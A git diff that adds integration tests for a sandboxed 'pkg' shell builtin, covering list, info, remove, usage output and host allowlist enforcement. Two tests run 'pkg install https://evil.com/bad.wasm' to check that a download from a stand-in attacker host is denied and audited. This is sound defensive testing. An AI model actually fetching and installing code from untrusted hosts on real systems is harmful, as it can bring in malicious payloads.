@@ -1,11 +1,14 @@
 /**
- * Tests for PackageManager and PackagePolicy types.
+ * Tests for PackageManager and pkg shell builtin integration.
  */
-import { describe, it, expect } from 'bun:test';
+import { describe, it, expect, afterEach } from 'bun:test';
+import { resolve } from 'node:path';
 import { VFS } from '../vfs/vfs.js';
 import { PackageManager, PkgError } from '../pkg/manager.js';
 import type { PackagePolicy } from '../security.js';
 import type { SecurityOptions } from '../security.js';
+import { Sandbox } from '../sandbox.js';
+import { NodeAdapter } from '../platform/node-adapter.js';
 
 const enabledPolicy: PackagePolicy = { enabled: true };
 
@@ -200,5 +203,174 @@ describe('PackageManager', () => {
     expect(opts.packagePolicy!.allowedHosts).toEqual(['example.com']);
     expect(opts.packagePolicy!.maxPackageBytes).toBe(1024 * 1024);
     expect(opts.packagePolicy!.maxInstalledPackages).toBe(10);
+  });
+});
+
+// ---- Shell builtin integration tests ----
+
+const WASM_DIR = resolve(import.meta.dirname, '../platform/__tests__/fixtures');
+const SHELL_WASM = resolve(import.meta.dirname, '../shell/__tests__/fixtures/wasmsand-shell.wasm');
+
+describe('pkg shell builtin', () => {
+  let sandbox: Sandbox;
+
+  afterEach(() => {
+    sandbox?.destroy();
+  });
+
+  it('pkg list returns empty initially', async () => {
+    sandbox = await Sandbox.create({
+      wasmDir: WASM_DIR,
+      shellWasmPath: SHELL_WASM,
+      adapter: new NodeAdapter(),
+      security: {
+        packagePolicy: { enabled: true },
+      },
+    });
+
+    const result = await sandbox.run('pkg list');
+    expect(result.exitCode).toBe(0);
+    expect(result.stdout).toBe('');
+  });
+
+  it('pkg returns error when disabled (no packagePolicy)', async () => {
+    sandbox = await Sandbox.create({
+      wasmDir: WASM_DIR,
+      shellWasmPath: SHELL_WASM,
+      adapter: new NodeAdapter(),
+      // No packagePolicy — packageManager will be null
+    });
+
+    const result = await sandbox.run('pkg list');
+    expect(result.exitCode).toBe(1);
+    expect(result.stderr).toContain('package manager is disabled');
+  });
+
+  it('pkg install rejects denied host', async () => {
+    sandbox = await Sandbox.create({
+      wasmDir: WASM_DIR,
+      shellWasmPath: SHELL_WASM,
+      adapter: new NodeAdapter(),
+      security: {
+        packagePolicy: {
+          enabled: true,
+          allowedHosts: ['trusted.example.com'],
+        },
+      },
+    });
+
+    // Host check in PackageManager.install() should deny evil.com before any actual fetch
+    const result = await sandbox.run('pkg install https://evil.com/bad.wasm');
+    expect(result.exitCode).toBe(1);
+    expect(result.stderr).toContain('not in the allowed hosts list');
+  });
+
+  it('pkg info on unknown package returns not found', async () => {
+    sandbox = await Sandbox.create({
+      wasmDir: WASM_DIR,
+      shellWasmPath: SHELL_WASM,
+      adapter: new NodeAdapter(),
+      security: {
+        packagePolicy: { enabled: true },
+      },
+    });
+
+    const result = await sandbox.run('pkg info nonexistent');
+    expect(result.exitCode).toBe(1);
+    expect(result.stderr).toContain('not found');
+  });
+
+  it('pkg with no subcommand shows usage', async () => {
+    sandbox = await Sandbox.create({
+      wasmDir: WASM_DIR,
+      shellWasmPath: SHELL_WASM,
+      adapter: new NodeAdapter(),
+      security: {
+        packagePolicy: { enabled: true },
+      },
+    });
+
+    const result = await sandbox.run('pkg');
+    expect(result.exitCode).toBe(1);
+    expect(result.stderr).toContain('usage:');
+    expect(result.stderr).toContain('install');
+    expect(result.stderr).toContain('remove');
+    expect(result.stderr).toContain('list');
+    expect(result.stderr).toContain('info');
+  });
+
+  it('pkg remove on unknown package returns error', async () => {
+    sandbox = await Sandbox.create({
+      wasmDir: WASM_DIR,
+      shellWasmPath: SHELL_WASM,
+      adapter: new NodeAdapter(),
+      security: {
+        packagePolicy: { enabled: true },
+      },
+    });
+
+    const result = await sandbox.run('pkg remove ghost');
+    expect(result.exitCode).toBe(1);
+    expect(result.stderr).toContain('not installed');
+  });
+
+  it('pkg install emits audit events', async () => {
+    const events: Array<{ type: string; [key: string]: unknown }> = [];
+
+    sandbox = await Sandbox.create({
+      wasmDir: WASM_DIR,
+      shellWasmPath: SHELL_WASM,
+      adapter: new NodeAdapter(),
+      security: {
+        packagePolicy: {
+          enabled: true,
+          allowedHosts: ['trusted.example.com'],
+        },
+        onAuditEvent: (event) => events.push(event),
+      },
+    });
+
+    // This will fail because evil.com is not in allowed hosts, but should emit audit events
+    await sandbox.run('pkg install https://evil.com/bad.wasm');
+
+    const pkgEvents = events.filter(e => e.type.startsWith('package.'));
+    expect(pkgEvents.length).toBeGreaterThanOrEqual(2);
+    expect(pkgEvents[0].type).toBe('package.install.start');
+    expect(pkgEvents[0].host).toBe('evil.com');
+
+    // The install should be denied
+    const deniedEvent = pkgEvents.find(e => e.type === 'package.install.denied');
+    expect(deniedEvent).toBeDefined();
+    expect(deniedEvent!.host).toBe('evil.com');
+  });
+
+  it('pkg install with no URL shows error', async () => {
+    sandbox = await Sandbox.create({
+      wasmDir: WASM_DIR,
+      shellWasmPath: SHELL_WASM,
+      adapter: new NodeAdapter(),
+      security: {
+        packagePolicy: { enabled: true },
+      },
+    });
+
+    const result = await sandbox.run('pkg install');
+    expect(result.exitCode).toBe(1);
+    expect(result.stderr).toContain('no URL specified');
+  });
+
+  it('pkg unknown subcommand returns error', async () => {
+    sandbox = await Sandbox.create({
+      wasmDir: WASM_DIR,
+      shellWasmPath: SHELL_WASM,
+      adapter: new NodeAdapter(),
+      security: {
+        packagePolicy: { enabled: true },
+      },
+    });
+
+    const result = await sandbox.run('pkg bogus');
+    expect(result.exitCode).toBe(1);
+    expect(result.stderr).toContain("unknown subcommand 'bogus'");
   });
 });
